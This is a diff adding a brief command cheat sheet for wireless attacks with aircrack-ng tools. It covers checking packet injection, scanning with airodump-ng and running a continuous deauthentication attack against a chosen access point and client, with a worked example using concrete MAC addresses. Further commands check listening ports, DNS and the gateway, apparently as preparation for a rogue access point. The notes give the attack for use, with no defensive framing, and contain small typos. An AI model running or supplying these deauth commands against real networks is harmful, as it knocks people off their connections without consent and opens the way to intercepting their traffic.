@@ -1,0 +1,22 @@
+Checks if the interface can inject packets:
+$sudo aireplay-ng -9 "ni_name"
+
+Scans the spectrum
+$sudo airodump-ng "ni_name"
+
+Deauth attack
+$sudo aireplay-ng -0 0 -a "AP_MAC" -c "TARGET_MAN" "NI_NAME
+example:
+sudo aireplay-ng -0 0 -a 26:18:1D:7C:7A:EB -c 5c:17:cf:9a:36:2f wlan1
+
+Set channel
+$sudo iwconfig "NI_NAME" channel 1
+
+Check all running processes and ports (for dnsmasq precheck)
+&sudo lsof -i -P -n | grep LIST
+
+get gateway IP
+$route -n
+
+check running dns:
+$sudo ss -lp "sport = :domain"
